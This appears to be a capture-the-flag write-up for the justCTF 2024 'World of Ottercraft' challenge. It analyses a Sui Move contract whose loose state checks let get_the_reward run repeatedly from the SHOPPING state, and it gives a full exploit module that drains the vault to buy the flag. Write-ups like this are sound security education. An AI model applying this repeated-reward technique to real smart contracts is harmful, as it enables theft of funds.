---
title: "World of Ottercraft - justCTF 2024 teaser"
category: "blockchain"
type: "writeup"
tags: ["blockchain", "world", "ottercraft", "justctf-2024-teaser", "2024", "ctf-writeup"]
summary: "This challenge was the Hard one of three blockchain challenges at justCTF 2024 teaser."
source:
  name: "CTFtime writeup #39254"
  url: "https://ctftime.org/writeup/39254"
original_source: "https://github.com/n4nika/writeups/blob/main/justCTF2024/world_of_ottercraft.md"
ctf:
  name: "justCTF 2024 teaser"
  year: 2024
  challenge: "World of Ottercraft"
---

## Metadata

- **CTF:** justCTF 2024 teaser
- **Task:** World of Ottercraft
- **Author team:** LosFuzzys
- **CTFtime:** <https://ctftime.org/writeup/39254>
- **Original writeup:** <https://github.com/n4nika/writeups/blob/main/justCTF2024/world_of_ottercraft.md>

---
# World of Ottercraft

This challenge was the `Hard` one of three blockchain challenges at `justCTF 2024 teaser`. All challenges were related to the `Sui` blockchain with the challenges being written in `Move`.

## Challenge Description  
```  
Welcome to the World of Ottercraft, where otters rule the blockchain! In this challenge, you'll dive deep into the blockchain to grab the mythical Otter Stone! Beware of the powerful monsters that will try to block your path! Can you outsmart them and fish out the Otter Stone, or will you just end up swimming in circles?

Challenge created by embe221ed & Darkstar49 from OtterSec

nc [woo.nc.jctf.pro](http://woo.nc.jctf.pro) 31337  
```

We were provided with a download link for a `tar` archive containing the challenge source and a full setup for the server and client.

## Challenge  
The goal of this challenge was, as with the `Medium` one, to buy the flag. Compared to the `Medium` one, there were the following changes :  
* buying items is more sophisticated with a ticket system and multiple items to buy  
* more sophisticated state machine where every function is restricted to be entered only by specific states

The were the following states:

* PREPARE_FOR_TROUBLE  
* ON_ADVENTURE  
* RESTING  
* SHOPPING  
* FINISHED

Here a visualization of which states can enter which function and how the state gets set in the end:

* `RESTING` -> `enter_tavern` -> `SHOPPING`  
* `SHOPPING` -> `buy_*`  
* `[ANY STATE]` -> `checkout` -> `RESTING`  
* `(PREPARE_FOR_TROUBLE, RESTING)` -> `find_a_monster` -> `PREPARE_FOR_TROUBLE`  
* `PREPARE_FOR_TROUBLE` -> `bring_it_on` -> `ON_ADVENTURE`  
* `ON_ADVENTURE` -> `return_home` -> `FINISHED`  
* `(FINISHED, SHOPPING)` -> `get_the_reward` -> `RESTING`

Now looking at these state requirements and transitions, what looks especially suspicious, is that `get_the_reward` can be entered from the `SHOPPING` state.   
Another notable change is, that the logic concerning what monster to get the reward from has been changed to the following:  
```Rust  
public fun bring_it_on(board: &mut QuestBoard, player: &mut Player, quest_id: u64) {  
assert!(player.status != SHOPPING && player.status != FINISHED && player.status != RESTING && player.status != ON_ADVENTURE, WRONG_PLAYER_STATE);

let monster = vector::borrow_mut(&mut board.quests, quest_id);  
assert!(player.power > monster.power, BETTER_GET_EQUIPPED);

player.status = ON_ADVENTURE;

player.power = 10; //equipment breaks after fighting the monster, and friends go to party :c  
monster.power = 0; //you win! wow!  
player.quest_index = quest_id; // <\-----  
}

public fun return_home(board: &mut QuestBoard, player: &mut Player) {  
assert!(player.status != SHOPPING && player.status != FINISHED && player.status != RESTING && player.status != PREPARE_FOR_TROUBLE, WRONG_PLAYER_STATE);

let quest_to_finish = vector::borrow(&board.quests, player.quest_index); // <\-----  
assert!(quest_to_finish.power == 0, WRONG_AMOUNT);

player.status = FINISHED;  
}

public fun get_the_reward(vault: &mut Vault<OTTER>, board: &mut QuestBoard, player: &mut Player, ctx: &mut TxContext) {  
assert!(player.status != RESTING && player.status != PREPARE_FOR_TROUBLE && player.status != ON_ADVENTURE, WRONG_PLAYER_STATE);

let monster = vector::remove(&mut board.quests, player.quest_index); // <\-----

let Monster {  
reward: reward,  
power: _  
} = monster;

let coins = coin::split(&mut vault.cash, reward, ctx);   
let balance = coin::into_balance(coins);

balance::join(&mut player.wallet, balance);

player.status = RESTING;  
}  
```

The monster to be rewarded for, is now determined when fighting it, and seemingly correctly used later when getting the reward.  
Also, when returning home, it is checked that the monster is actually defeated. So if we were to follow the state machine as intended, everything would be fine.  
If we manage to enter `get_the_reward` multiple times however, we could do an attack similar to the one in the previous challenge. We could fight the monster at index 0. This would cause `get_the_reward` to take the 0th monster every consecutive time. If we now do not have to enter `return_home` before that, the monster is never checked to be beaten.

## Approach  
Now putting the findings above together, we know the following:  
* we can enter `get_the_reward` also from the `SHOPPING` state  
* `checkout` can be entered from every state  
* `get_the_reward` sets the state to `RESTING`  
* `enter_tavern` sets the state to `SHOPPING`

The approach now looks like this:  
1) find multiple monsters  
2) fight the 0th monster normally and collect its reward  
3) `enter_tavern` (sets state to `SHOPPING`)  
4) buy the cheapest item (`buy_shield`)  
5) "re-enter" `get_the_reward` which then sets the state to `RESTING`  
6) `checkout`  
7) repeat steps 3 to 6 until we have enough money to buy the flag  
8) profit

Now one might think we could just `enter_tavern`, `get_the_reward`, without buying anything but this does not work due to checks done by `Move`.  
More specifically, when we `enter_tavern`, we get a `ticket`. This ticket needs to be returned to `checkout` in order for our contract to even compile. Due to this, we need to return the ticket to `checkout` which has a check, that the `total` is greater than zero, meaning we need to buy something. Fortunately, there is an item `shield`, which costs less than what we receive from fighting a monster (only 20 coins, we get at least 62 coins as a reward). 

Now before fighting the monster we need to buy some item that has enough power to beat the first monster (`shield` obviously does not have enough).  
The clear choice here is, of course, the `power_of_friendship`:  
```Rust  
public fun buy_power_of_friendship(player: &mut Player, ticket: &mut TawernTicket) {  
assert!(player.status == SHOPPING, WRONG_PLAYER_STATE);

player.power = player.power + 9000; //it's over 9000!  
ticket.total = ticket.total + 190;  
}  
```

## Exploit  
Putting everything together, we built the following exploit:  
```Rust  
module solve::solve {

// [*] Import dependencies  
use challenge::Otter::{Self, OTTER};

public fun solve(  
_board: &mut Otter::QuestBoard,  
_vault: &mut Otter::Vault<OTTER>,  
_player: &mut Otter::Player,  
_ctx: &mut TxContext  
) {  
// Your code here...  
let mut ticket = Otter::enter_tavern(_player);

Otter::buy_power_of_friendship(_player, &mut ticket);

Otter::checkout(ticket, _player, _ctx, _vault, _board);

let mut i = 0;  
while (i < 20) {  
Otter::find_a_monster(_board, _player);  
i = i + 1;  
};

Otter::bring_it_on(_board, _player, 0);  
Otter::return_home(_board, _player);  
Otter::get_the_reward(_vault, _board, _player, _ctx);

let mut i = 0;  
while (i < 10) {  
let mut tick = Otter::enter_tavern(_player);  
Otter::buy_shield(_player, &mut tick);  
Otter::get_the_reward(_vault, _board, _player, _ctx);  
Otter::checkout(tick, _player, _ctx, _vault, _board);  
i = i+1;  
};

let mut ticket0 = Otter::enter_tavern(_player);

Otter::buy_flag(&mut ticket0, _player);  
Otter::checkout(ticket0, _player, _ctx, _vault, _board);  
}  
}

```  
Throwing this at the remote server then yields the flag.
